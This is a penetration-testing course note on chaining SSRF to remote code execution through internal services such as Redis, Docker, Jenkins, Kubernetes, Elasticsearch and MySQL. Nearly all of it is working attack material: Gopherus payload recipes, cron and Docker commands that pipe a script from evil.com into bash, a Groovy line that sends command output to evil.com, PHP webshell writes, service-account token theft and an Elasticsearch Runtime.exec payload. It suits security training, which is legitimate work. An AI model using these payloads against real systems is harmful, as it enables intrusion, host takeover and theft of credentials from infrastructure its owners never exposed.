---
tags: [vapt, ssrf, advanced]
difficulty: advanced
module: "13 - SSRF"
topic: "13.18 SSRF to RCE via Internal Services"
---

# 13.18 — SSRF to RCE via Internal Services

## SSRF → RCE Paths

```
HOW SSRF CAN LEAD TO REMOTE CODE EXECUTION:

PATH 1: Redis without authentication (gopher SSRF)
  SSRF → gopher → Redis commands → write SSH key / cron job → RCE!

PATH 2: Docker API without TLS (port 2375)
  SSRF → Docker API → create container with host mount → RCE on host!

PATH 3: Jenkins RCE
  SSRF → Jenkins script console → Groovy code execution → RCE!

PATH 4: Kubernetes API
  SSRF → Kubernetes API → create pod with hostPID → RCE on node!

PATH 5: Elasticsearch script
  SSRF → Elasticsearch script query → Groovy/Python execution → RCE!

PATH 6: SQL injection via SSRF
  SSRF → MySQL via gopher → SQL queries → LOAD_FILE / INTO OUTFILE → RCE!
```

---

## Path 1 — Redis RCE via Gopher

```bash
# REQUIREMENTS:
# - SSRF that supports gopher://
# - Redis on port 6379 without AUTH password
# - Redis running as a user with write access

# METHOD 1: WRITE SSH AUTHORIZED_KEYS:
# Use Gopherus to generate payload:
python3 gopherus.py --exploit redis

# Gopherus asks:
# What do you want? (ssh key or crontab or php/asp webshell)
# Enter: 2 (for SSH key)
# Enter your SSH public key: [paste your public key]
# Output: gopher URL!

# Use the gopher URL as SSRF target:
# url=gopher://127.0.0.1:6379/_%2A%2E%2E%2E

# METHOD 2: WRITE CRON JOB (if running as root or cron user):
python3 gopherus.py --exploit redis
# Choose: crontab
# Enter: curl http://evil.com/shell | bash
# Output: gopher URL

# METHOD 3: WEBSHELL (if web dir is writable):
python3 gopherus.py --exploit redis
# Choose: PHP webshell
# Enter web root path: /var/www/html/
# Enter webshell filename: shell.php
# Output: gopher URL → writes <?php system($_GET['cmd']); ?> to file!
```

---

## Path 2 — Docker API RCE

```bash
# REQUIREMENTS:
# - SSRF to http://127.0.0.1:2375/ (Docker daemon without TLS)
# - Docker daemon running

# STEP 1: CONFIRM DOCKER API VIA SSRF:
url=http://127.0.0.1:2375/version
# Returns: Docker version info → confirmed!

url=http://127.0.0.1:2375/containers/json
# Lists running containers!

# STEP 2: RCE VIA CONTAINER (need POST SSRF — gopher):
# Create container with /host mounted from host filesystem:
# Gopherus generates the payload!
python3 gopherus.py --exploit docker
# Enter command to run on host: curl http://evil.com/shell.sh | bash
# Output: gopher URL for SSRF

# STEP 3: START THE CONTAINER VIA SSRF:
# Second gopher request to start the created container

# RESULT: Shell on host machine via Docker container escape!
```

---

## Path 3 — Jenkins Script Console

```
JENKINS HAS A GROOVY SCRIPT CONSOLE AT:
  http://jenkins:8080/script
  
  If accessible without auth (misconfigured Jenkins):
  
  SSRF → Jenkins script console → Groovy → OS commands!

DETECT VIA SSRF:
  url=http://127.0.0.1:8080/
  → Returns Jenkins HTML → confirmed!
  
  url=http://127.0.0.1:8080/script
  → Script console (if no auth) → RCE!

GROOVY RCE PAYLOAD (in script console):
  println "id".execute().text
  println "curl http://evil.com/$(id)".execute().text

VIA SSRF WITH POST (gopher):
  python3 gopherus.py --exploit jenkins
  (some Gopherus versions support Jenkins)
  
  OR manually:
  gopher://127.0.0.1:8080/_POST%20/script%20HTTP/1.1%0d%0a
  Host:%20localhost%0d%0a
  Content-Type:%20application/x-www-form-urlencoded%0d%0a
  Content-Length:%2050%0d%0a%0d%0a
  script=throw+new+Exception("id".execute().text)
```

---

## Path 4 — Kubernetes SSRF to RCE

```bash
# STEP 1: GET KUBERNETES SERVICE ACCOUNT TOKEN (from inside pod):
url=file:///var/run/secrets/kubernetes.io/serviceaccount/token
# Returns: JWT token for the current pod's service account

# STEP 2: USE TOKEN TO ACCESS K8S API:
url=https://kubernetes.default.svc/api/v1/namespaces/
# With Authorization: Bearer TOKEN header (need to inject via SSRF headers)

# STEP 3: CREATE PRIVILEGED POD FOR RCE:
# POST to Kubernetes API to create a pod with hostPID: true and privilege
# This gives access to all host processes → RCE on K8s node!

# IF KUBELET PORT IS OPEN (10250):
url=http://10.96.0.1:10250/pods
# Lists all pods → shows environment variables → secrets!

url=https://10.96.0.1:10250/run/default/TARGET_POD/TARGET_CONTAINER
# Execute command in existing container (no auth if misconfigured)!
```

---

## Path 5 — Elasticsearch Groovy Script RCE

```bash
# OLD ELASTICSEARCH (< 1.6) ALLOWED DYNAMIC SCRIPTS:
url=http://127.0.0.1:9200/_search?pretty=true

# RCE PAYLOAD (ES < 1.6):
url=http://127.0.0.1:9200/_search?source={"script_fields":{"shell":{"script":"java.lang.Math.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(java.lang.Math.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')"}}}&source_content_type=application/json

# MODERN ES (check for script execution enabled):
url=http://127.0.0.1:9200/_scripts/
# If scripts enabled → POST a Painless script → execute code!
```

---

## Path 6 — MySQL via Gopher

```bash
# REQUIREMENTS:
# - MySQL with no password or known password
# - FILE privilege enabled
# - Gopher SSRF

# GOPHERUS MYSQL:
python3 gopherus.py --exploit mysql

# Prompts:
# MySQL user: root
# Password: (empty if no password)
# Database: mysql
# Query: SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/shell.php"

# Output: gopher URL
# Use as SSRF → writes PHP webshell to web root!
# Visit https://target.com/shell.php?cmd=id → RCE!
```

---

## Quick Reference: SSRF → RCE Paths

```
SERVICE          PORT    TECHNIQUE               REQUIREMENT
────────────────────────────────────────────────────────────────────
Redis            6379    Gopher + cron/SSH key   No auth, write access
Docker API       2375    HTTP + container mount  No TLS
Jenkins          8080    Groovy script console   No auth or known creds
Kubernetes       10250   Kubelet exec API        No auth
Elasticsearch    9200    Dynamic script API      Scripts enabled
MySQL            3306    Gopher + INTO OUTFILE   No auth, FILE priv
PHP-FPM          9000    Gopher + FCGI           PHP-FPM exposed
Memcached        11211   Session hijack → RCE    Sessions stored
Apache Struts    8080    SSRF to admin endpoint  Struts vuln
```

---

## Related Notes
- [[12 - SSRF Internal Services]] — reaching services
- [[13 - SSRF Protocol Smuggling]] — gopher:// for RCE chains
- [[11 - SSRF Internal Port Scanning]] — finding services
- [[19 - SSRF to Cloud Credential Theft]] — cloud RCE
